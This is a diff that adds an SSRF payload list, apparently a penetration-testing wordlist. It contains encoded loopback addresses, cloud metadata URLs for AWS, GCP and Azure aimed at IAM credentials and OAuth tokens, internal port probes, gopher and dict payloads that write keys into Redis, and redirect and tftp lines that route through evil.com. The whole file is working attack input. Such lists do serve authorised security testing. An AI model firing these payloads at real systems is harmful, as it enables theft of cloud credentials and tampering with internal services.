@@ -1,0 +1,54 @@
+# SSRF Payloads - Curated from exploit-cookbook + security-arsenal
+# Source: proven-exploits.md + security-arsenal-argus.md
+
+# Basic SSRF
+http://127.0.0.1/
+http://localhost/
+http://[::1]/
+http://0177.0.0.1/          # Octal IP
+http://127.1/               # Short IP
+http://0x7f000001/          # Hex IP
+http://2130706433/          # Decimal IP
+http://0.0.0.0/
+
+# AWS metadata (IMDSv1)
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+http://169.254.169.254/latest/dynamic/instance-identity/document
+http://169.254.169.254/latest/user-data/
+
+# GCP metadata
+http://169.254.169.254/computeMetadata/v1/
+http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token
+http://169.254.169.254/computeMetadata/v1/project/project-id
+
+# Azure metadata
+http://169.254.169.254/metadata/instance?api-version=2021-02-01
+http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
+
+# Internal service fingerprinting
+http://127.0.0.1:22/        # SSH
+http://127.0.0.1:80/        # HTTP
+http://127.0.0.1:443/       # HTTPS
+http://127.0.0.1:3306/      # MySQL
+http://127.0.0.1:5432/      # PostgreSQL
+http://127.0.0.1:6379/      # Redis
+http://127.0.0.1:8080/      # Internal HTTP
+http://127.0.0.1:9200/      # Elasticsearch
+http://127.0.0.1:27017/     # MongoDB
+
+# Redis via Gopher
+gopher://127.0.0.1:6379/_*3%0d%0aset%20test%201%0d%0a*1%0d%0a$4%0d%0aping%0d%0a
+
+# Redirect-based SSRF
+http://evil.com/redirect?url=http://169.254.169.254/
+http://evil.com/short?url=http://internal-server/
+
+# DNS rebind
+# Use: rbndr.us or custom DNS server
+# Example: a.rbndr.us → 1.2.3.4 first, then 169.254.169.254 on second query
+
+# Protocol smuggling
+gopher://127.0.0.1:6379/_*3%0d%0aset%20pwned%20true%0d%0a
+dict://127.0.0.1:6379/info
+tftp://evil.com:69/GET
